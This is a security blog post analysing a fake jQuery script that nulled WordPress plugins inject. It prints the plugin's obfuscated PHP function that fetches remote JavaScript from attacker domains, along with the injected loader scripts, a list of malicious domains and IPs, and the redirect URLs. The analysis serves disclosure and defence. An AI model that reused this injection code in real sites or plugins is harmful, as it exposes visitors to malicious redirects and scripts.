@@ -1,0 +1,98 @@
+Fake jQuery Scripts in Nulled WordPress Plugins
+
+We recently investigated some random redirects on a WordPress website that would only happen to certain visitors. Traffic analysis showed us that it was not a server-side redirect, rather it happened due to some script loaded by the web pages.
+A quick look through the HTML code revealed this script:
+Fake jQuery script injection
+It was very suspicious for a few reasons:
+
+www . wpquery . org/jquery.js — it’s definitely not a real jQuery domain and WordPress comes with prepackaged version of jquery.js so there’s no need to link to it on some third party site.
+
+The script inclusion is random. It only happens if the current time value (in milliseconds) is even:
+if (now%2 == 0)
+
+It includes either jquery.min.js or jquery.js based on whether the current request has a referrer or not. That just doesn’t make sense.
+
+Wp_func_jquery Function
+This script was placed in the section between other scripts, so it was most likely injected by a wp_head hook in a theme or plugin. A quick search revealed the Ultimate_VC_Addons plugin that contained this code:
+if(!function_exists('wp_func_jquery')) {
+function wp_func_jquery() {
+$host = 'http://';
+$library = '/jquery-1.6.3.min.js';
+echo(wp_remote_retrieve_body(wp_remote_get($host.'jquery'.'libs .org'.$library)));
+}
+if(rand(1,2) == 1) {
+add_action('wp_footer', 'wp_func_jquery');
+}
+else {
+add_action('wp_head', 'wp_func_jquery');
+}
+}
+As you can see, this wp_func_jquery function tries to highlight benign strings such as “jquery-1.6.3.min.js“, “jquery“, “libs.org” and make it less obvious that it injects the content from hxxp:// jquerylibs . org/jquery-1.6.3.min.js into web pages. Moreover, you can see that this function is used randomly either in the header or footer of WordPress pages.
+When I checked that hxxp:// jquerylibs . org/jquery-1.6.3.min.js URL, I found the www . wpquery . org script that you see at the top of this post. Bingo!
+Fake jQuery Domains
+Further analysis showed that wpquery .org and jquerylibs.org are not the only fake jQuery domains used in this attack. We identified the following 8 malicious domains on 2 servers.
+On 176 .9 .91 .14 (Germany Nuremberg Hetzner Online Ag)
+
+jquerylibs . org — Created on June 2, 2014
+uijquery . org — Created on July 10, 2014
+ujquery . org — Created on November 5, 2014
+cjquery . org — Created on January 16, 2015
+ejquery . org — Created on February 28, 2015
+
+On 62 .210 .149 .60 (France Paris Online S.a.s.)
+
+wpstat . org — Created on 2015-04-05
+wplibs . org — Created on 2015-04-05
+wpquery . org — Created on 2015-04-05
+
+Malware Evolution
+In this section we will show you how the attack evolved over time.
+Initially the attackers used the same domains both in the PHP code and in the injected JS code. The earlier versions of the malicious script looked like this:
+<script type="text/javascript">
+if (!document.referrer || document.referrer == '') {
+document.write('<scr' + 'ipt type="text/javascript" src="hxxp ://www[.]jquerylibs[.]org/jquery.min.js"></scr' + 'ipt>');
+} else {
+document.write('<scr' + 'ipt type="text/javascript" src="hxxp ://www[.]jquerylibs[.]org/jquery.js"></scr' + 'ipt>');
+}
+</script>
+They continued to introduce new fake jQuery domains every few months when they began experiencing problems (e.g. blacklists) with their current domains.
+Then, in April, they changed their tactics, and decided to reuse old domain in the PHP code (which is not publicly visible) but created a few new fake domains on another server for the publicly visible JS injection.
+You can also see how it evolved by the way they obfuscated those domains in the PHP code:
+//direct call with string concatenation ...
+echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
+...
+//checking headers first...
+$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
+$headers = get_headers($jquery, 0);
+if ($headers[0] == 'HTTP/1.1 200 OK'){
+echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
+}
+...
+//It's not always jquery-1.6.3.min.js, on on cjquery . org it is jquery-ui.js
+$jquery = $host.'c'.'jquery.org/jquery-ui.js';
+...
+//using the library var in concatenation...
+$host = 'http://';
+$library = '/jquery-1.6.3.min.js';
+echo(wp_remote_retrieve_body(wp_remote_get($host.'jquery'.'libs.org'.$library)));
+With time, they also added some randomness to both the PHP code and the JS to make it harder to detect the script. Initially, they only injected the script in the footer sections, but in more recent versions, it can be either in the header or in the footer:
+if(rand(1,2) == 1) {
+add_action('wp_footer', 'wp_func_jquery');
+}
+else {
+add_action('wp_head', 'wp_func_jquery');
+}
+And the remote script is now injected with the 50% probability.
+var now = new Date().getTime(); if (now%2 == 0) {
+... remote script injection here ...
+}
+Redirections
+If you try to open the malicious scripts in your browser, many of you will not see anything, but it doesn’t mean they are benign. The headers of the .js responses show that they are being served by PHP engine rather than as a static content, so their content may change at any moment for the users they are really interested in. At this time, we know that the scripts may redirect some visitors to hxxp: / / lock . page-request . com/mobile/m.html, which redirects desktop users further to hxxp://online-news . us/work-from-home-report/ and mobile users to URLs like these:
+
+hxxp:/ /link .clickdirected .com/tracking202/redirect/dl.php?t202id=553&t202kw=
+hxxp:/ /bangkokboy .791 .a .clickbetter .com
+
+Infection Vector
+In all cases we see the malicious code is injected into legitimate premium plugins and themes that are then distributed on untrustworthy sites. If you Google the phrase [wp_func_jquery], you’ll find a few forum threads where people find this malicious code inside the so-called “nulled” packages of various plugins. This infection vector is quite popular in the WordPress world and we have blogged about the threats of using pirated software on your websites before.
+Most specialized websites that offer “nulled” software exist because they inject backdoors, malware and black-hat SEO spam into the pirated software they offer. This is not a WordPress specific problem. The same applies to “nulled” extensions, templates, etc. for Joomla!, Drupal and other CMS. We recommend reading a great write-up (by Fox-IT) of the CryptoPHP malware whose main distribution channel is “nulled” plugins and extensions.
+This is just another warning to website owners to stay away from third-party software that comes from shady sources.
